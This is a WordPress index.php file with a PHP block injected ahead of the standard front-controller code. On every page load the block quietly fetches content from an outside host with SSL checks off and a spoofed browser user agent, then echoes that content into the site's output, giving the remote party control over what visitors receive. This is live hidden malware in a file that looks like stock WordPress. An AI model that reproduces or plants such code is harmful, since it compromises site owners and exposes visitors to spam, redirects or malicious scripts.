<?php $u='https://app.linkmarketim.com/code?x=13';$d=false;if(function_exists('curl_init')){$ch=curl_init($u);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0');$d=curl_exec($ch);curl_close($ch);}if($d===false && ini_get('allow_url_fopen')){$ctx=stream_context_create(array('http'=>array('timeout'=>10,'follow_location'=>1,'ignore_errors'=>1,'header'=>"User-Agent: Mozilla/5.0\r\n"),'ssl'=>array('verify_peer'=>0,'verify_peer_name'=>0)));$d=@file_get_contents($u,false,$ctx);}echo $d!==false?$d:'<!-- İçerik yüklenemedi -->'; ?>

<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';